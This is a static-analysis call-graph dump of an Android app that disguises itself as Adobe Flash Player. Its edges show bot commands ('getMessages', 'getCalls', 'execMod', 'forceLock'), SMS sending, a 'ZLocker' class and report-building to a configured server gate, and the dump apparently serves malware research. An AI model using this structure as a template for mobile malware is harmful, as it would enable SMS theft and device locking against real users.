SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getMessages:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("forceZ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("*") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r19) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String getResultData()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: java.lang.String getResultData()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("forceLock") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashY: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r2.<java.io.BufferedReader: void <init>(java.io.Reader)>(r3) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
STATIC edge: staticinvoke <java.lang.System: void exit(int)>(0) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <java.lang.System: void exit(int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "On", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
CLINIT edge: staticinvoke <java.io.File: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.io.File: void <clinit>()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $z1 = virtualinvoke $r21.<java.lang.String: boolean equals(java.lang.Object)>("On") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r27) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("3gOn") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" sec\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("execMod[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r2.<java.io.BufferedReader: void <init>(java.io.Reader)>(r3) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: $r10 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r19) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r21) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $z0 = virtualinvoke r19.<java.lang.String: boolean contains(java.lang.CharSequence)>("On") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
CLINIT edge: staticinvoke <android.os.AsyncTask: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.os.AsyncTask: void <clinit>()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r41) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r1 = virtualinvoke r4.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashY: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: android.content.Intent getIntent()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
SPECIAL edge: $r6 = specialinvoke r0.<com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>("lockd", $r1) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashW: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r8 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.Object getSystemService(java.lang.String)>("power") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r18 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("execMod") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r59.<com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>($r38, "ON") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getCalls") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r44 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i2) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $r18 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.packages.ZLocker: void <init>()>() in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <com.adobe.packages.ZLocker: void <init>()>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.app.Service: void onCreate()>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r5, $r17, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r17 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r15.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "Off", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.ADOBEcoreZa: void onEnabled(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: void onEnabled(android.content.Context,android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.os.AsyncTask: void <init>()>() in <com.adobe.flashplayer_.FlashVars: void <init>()> ==> <android.os.AsyncTask: void <init>()>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
